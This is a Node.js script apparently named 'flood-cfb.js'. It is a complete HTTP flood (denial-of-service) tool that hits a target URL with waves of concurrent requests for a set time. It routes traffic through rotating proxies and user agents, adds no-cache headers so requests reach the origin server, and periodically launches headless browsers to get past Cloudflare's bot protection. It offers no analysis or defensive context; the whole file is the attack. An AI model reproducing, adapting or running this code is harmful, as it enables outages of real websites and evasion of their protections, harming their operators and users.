const puppeteer = require('puppeteer');
const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');
const http = require('http');
const https = require('https');

const proxyList = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
const userAgentList = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);

const sendHttpRequest = async (url, proxy, userAgent) => {
  try {
    const parsedUrl = new URL(url);
    const agent = parsedUrl.protocol === 'https:' 
      ? new https.Agent({ rejectUnauthorized: false, proxy: false })
      : new http.Agent();
    
    await axios({
      method: 'GET',
      url: url,
      headers: { 
        'User-Agent': userAgent,
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Accept': '*/*'
      },
      proxy: { host: proxy.split(':')[0], port: parseInt(proxy.split(':')[1]) },
      httpAgent: agent,
      httpsAgent: agent,
      timeout: 3000
    });
  } catch (err) {
    // Ignore all errors
  }
};

const bypassCloudflare = async (url, proxy, userAgent) => {
  try {
    const browser = await puppeteer.launch({ 
      headless: true,
      args: [
        '--no-sandbox', 
        '--disable-setuid-sandbox',
        `--proxy-server=http://${proxy}`,
        '--disable-gpu',
        '--disable-dev-shm-usage'
      ]
    });
    const page = await browser.newPage();
    await page.setUserAgent(userAgent);
    await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-US,en;q=0.9' });
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 8000 }).catch(() => {});
    await page.evaluate(() => {
      window.scrollTo(0, document.body.scrollHeight);
    }).catch(() => {});
    await browser.close();
  } catch (err) {
    // Ignore all errors
  }
};

const sendRequest = async (url, timeLimit) => {
  const endTime = Date.now() + timeLimit * 1000;
  
  while (Date.now() < endTime) {
    const promises = [];
    for (let i = 0; i < 100; i++) {
      const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
      const userAgent = userAgentList[Math.floor(Math.random() * userAgentList.length)];
      promises.push(sendHttpRequest(url, proxy, userAgent));
      if (i % 10 === 0) {
        promises.push(bypassCloudflare(url, proxy, userAgent));
      }
    }
    await Promise.allSettled(promises);
  }
};

const [url, time] = process.argv.slice(2);
const timeLimit = parseInt(time);

if (!url || !timeLimit) {
  console.log('Usage: node flood-cfb.js <url> <time>');
  process.exit(1);
}

console.log('attack started');
sendRequest(url, timeLimit);